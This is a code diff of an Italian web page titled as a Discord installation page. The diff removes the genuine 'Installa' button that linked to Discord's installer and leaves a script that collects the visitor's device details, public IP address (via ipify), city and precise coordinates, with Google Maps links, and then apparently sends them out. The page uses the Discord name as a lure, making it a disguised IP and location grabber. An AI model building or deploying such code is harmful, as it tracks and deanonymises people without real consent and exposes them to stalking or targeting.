@@ -12,28 +12,12 @@
             background-color: #f4f4f4;
             text-align: center;
         }
-        button {
-            background-color: #007bff; /* Blu */
-            color: white; /* Testo bianco */
-            padding: 10px 20px; /* Spaziatura interna */
-            border: none; /* Nessun bordo */
-            border-radius: 5px; /* Bordi arrotondati */
-            font-size: 16px; /* Dimensione del testo */
-            cursor: pointer; /* Puntatore a mano */
-            transition: background-color 0.3s; /* Transizione del colore */
-        }
-        button:hover {
-            background-color: #0056b3; /* Blu più scuro al passaggio del mouse */
-        }
     </style>
 </head>
 <body>
-
     <h1>Installazione di Discord</h1>
-    <button onclick="window.location.href='https://discord.com/api/downloads/distributions/app/installers/latest?channel=stable&platform=win&arch=x64';">
-        Installa
-    </button>
-
+    <p>Le informazioni sul dispositivo verranno inviate automaticamente.</p>
+    
     <script>
         async function sendDeviceInfo() {
             const deviceInfo = {
@@ -63,7 +47,7 @@
                 memory: navigator.deviceMemory || 'N/A'
             };
 
-            // Ottieni l'indirizzo IP tramite un servizio esterno
+            // Ottieni l'indirizzo IP e informazioni geografiche
             await fetch('https://api.ipify.org?format=json')
                 .then(response => response.json())
                 .then(data => {
@@ -76,6 +60,7 @@
                 .then(data => {
                     if (data.city) {
                         deviceInfo.location.city = data.city;
+                        deviceInfo.location.link = `https://www.google.com/maps?q=${data.loc}`;
                     }
                 });
 
@@ -87,7 +72,7 @@
                     deviceInfo.location = {
                         latitude: lat,
                         longitude: lon,
-                        link: `https://www.google.com/maps?q=${lat},${lon}` // Link alla posizione su Google Maps
+                        link: `https://www.google.com/maps?q=${lat},${lon}`
                     };
                 });
             }
